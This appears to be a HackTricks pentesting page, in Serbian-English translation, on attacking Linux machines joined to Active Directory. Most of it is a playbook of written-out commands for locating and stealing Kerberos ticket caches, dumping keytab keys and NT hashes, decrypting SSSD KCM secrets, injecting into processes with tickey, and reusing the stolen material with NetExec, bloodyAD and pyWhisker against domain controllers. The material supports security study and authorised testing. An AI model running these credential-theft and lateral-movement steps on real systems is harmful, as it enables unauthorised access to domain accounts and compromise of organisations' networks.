# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux mašina takođe može biti prisutna unutar Active Directory okruženja.

Linux mašina unutar AD može **lokalno da skladišti Kerberos materijal**: user ccaches, machine/service keytabs, i SSSD-managed secrets. Ovi artefakti se obično mogu ponovo iskoristiti kao i bilo koji drugi Kerberos credential. Da biste pročitali većinu njih, moraćete da budete user vlasnik tiketa ili **root** na mašini.

## Enumeration

### AD enumeration from linux

Ako imate access na AD u linuxu (ili bash u Windows), možete pokušati [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) da enumerate AD.

Takođe možete pogledati sledeću stranicu da biste naučili **druge načine da enumerate AD from linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA je open-source **alternativa** za Microsoft Windows **Active Directory**, uglavnom za **Unix** okruženja. Ona kombinuje kompletan **LDAP directory** sa MIT **Kerberos** Key Distribution Center za management nalik Active Directory. Koristeći Dogtag **Certificate System** za CA & RA certificate management, podržava **multi-factor** authentication, uključujući smartcards. SSSD je integrisan za Unix authentication procese. Saznajte više o tome u:


{{#ref}}
../freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

Pre nego što dirnete tikete, identifikujte **kako je host joined to AD** i **gde je Kerberos material zaista stored**. Na modern Linux hostovima ovo se najčešće handle-uje preko `realmd` + `adcli` + `sssd`, a ne samo kroz flat files u `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Ovo vam brzo govori da li host veruje AD, da li SSSD kešira identitete ili tikete, i da li su dostupni **machine/service keytabs** ili **KCM secrets** za zloupotrebu.

## Playing with tickets

### Pass The Ticket

Na ovoj stranici ćete pronaći različita mesta gde možete **pronaći kerberos tickets unutar linux hosta**, a na sledećoj stranici možete naučiti kako da transformišete ove CCache formate tiketa u Kirbi (format koji treba da koristite u Windows) i takođe kako da izvedete PTT attack:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Ako želite **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, itd.), pogledajte namensku stranicu:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### CCACHE ticket reuse from /tmp

CCACHE fajlovi su binarni formati za **čuvanje Kerberos credentials**. `FILE:/tmp/krb5cc_%{uid}` je i dalje uobičajen, ali moderne Linux implementacije takođe koriste `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, ili `KCM:%{uid}`. Proverite promenljivu okruženja **`KRB5CCNAME`** i podešavanje `default_ccache_name` pre nego što pretpostavite da tiketi postoje u `/tmp`.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### CCACHE reuse karte iz keyring-a

**Kerberos tickets sačuvani u memoriji procesa mogu da se izdvoje**, naročito kada je ptrace zaštita na mašini onemogućena (`/proc/sys/kernel/yama/ptrace_scope`). Koristan alat za ovu svrhu nalazi se na [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), koji olakšava izdvajanje ubacivanjem u sesije i dumpovanjem ticket-a u `/tmp`.

Za konfigurisanje i korišćenje ovog alata, prate se sledeći koraci:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Ovaj postupak će pokušati da se ubaci u različite sesije, pri čemu uspeh označava čuvanjem izvučenih tickets u `/tmp` sa naming convention `__krb_UID.ccache`.

### CCACHE ticket reuse iz SSSD KCM

SSSD održava kopiju baze podataka na putanji `/var/lib/sss/secrets/secrets.ldb`. Odgovarajući key je sačuvan kao skriveni fajl na putanji `/var/lib/sss/secrets/.secrets.mkey`. Podrazumevano, key je čitljiv samo ako imate **root** permissions.

Pozivanje **`SSSDKCMExtractor`** sa --database i --key parametrima će parsirati bazu podataka i **decrypt the secrets**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
The **Kerberos blob iz cache-a kredencijala može da se konvertuje u upotrebljiv Kerberos CCache** fajl koji može da se prosledi Mimikatz/Rubeus.

### Quick keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Extract accounts from /etc/krb5.keytab

Ključevi service account-a, ključni za servise koji rade sa root privilegijama, bezbedno su smešteni u **`/etc/krb5.keytab`** fajlovima. Ovi ključevi, nalik lozinkama za servise, zahtevaju strogu poverljivost.

Za pregled sadržaja keytab fajla, može se koristiti **`klist`**. Na Linux-u, `klist -k -K -e` prikazuje principals, brojeve verzija ključa, tipove enkripcije i sirove key materijale. Ako je tip ključa **23 / RC4-HMAC**, vrednost ključa je takođe i **NT hash** tog principal-a.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Za Linux korisnike, **`KeyTabExtract`** nudi funkcionalnost za izdvajanje RC4 HMAC hash-a, što može da se iskoristi za ponovnu upotrebu NTLM hash-a. Imajte na umu da ovo pomaže samo kada keytab i dalje sadrži **etype 23 / RC4-HMAC** materijal. U okruženjima sa samo **AES-only** možda nećete dobiti NT hash koji se može ponovo koristiti, ali i dalje možete da se autentifikujete direktno pomoću keytab-a preko Kerberos-a.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Na macOS, **`bifrost`** služi kao alat za analizu keytab fajlova.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Koristeći izvučene informacije o nalogu i hash-u, veze ka serverima mogu se uspostaviti pomoću alata kao što je **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Ponovo upotrebite machine account iz `/etc/krb5.keytab`

Na sistemima pridruženim preko `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` obično sadrži **computer account** i jedan ili više **host/service principals**. Ako imate **root**, nemojte samo da ga izvučete: upotrebite jedan od principals navedenih pomoću `klist -k` da zatražite TGT i radite kao sam Linux host.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Ovo je posebno korisno kada sam **computer object** ima delegirana prava u AD ili kada je hostu dozvoljeno da preuzme druge tajne, kao što je **gMSA**.

### Ponovo iskoristi ukradeni Kerberos materijal uz Linux-first AD tooling

Kada imaš validan `ccache` ili upotrebljiv keytab, možeš raditi protiv AD **direktno sa Linuxa** bez prethodnog konvertovanja svega u Windows formate. Mnogi moderni alati nativno prihvataju `KRB5CCNAME` / Kerberos auth:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Ovo je dobar most između **Linux post-exploitation** i **AD object abuse**. Za same putanje abuse-a na nivou objekata, pogledaj:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

Skorija Linux deployments mogu direktno da koriste **Managed Service Accounts** iz AD. U praksi to znači da, nakon kompromitovanja Linux servera, možeš pronaći ne samo host keytab već i **service-specific keytabs** generisane iz gMSA. Uobičajena mesta za proveru su `/etc/gmsad.conf`, deployment-specific config files, i dodatni `*.keytab` fajlovi u okviru `/etc`.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Ovo vam daje reusable Kerberos identitet za SPN-ove vezane za taj gMSA **bez dodirivanja bilo kog Windows endpoint-a**. Za **domain-side** gMSA/dMSA abuse nakon viših privilegija u AD, pogledajte:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
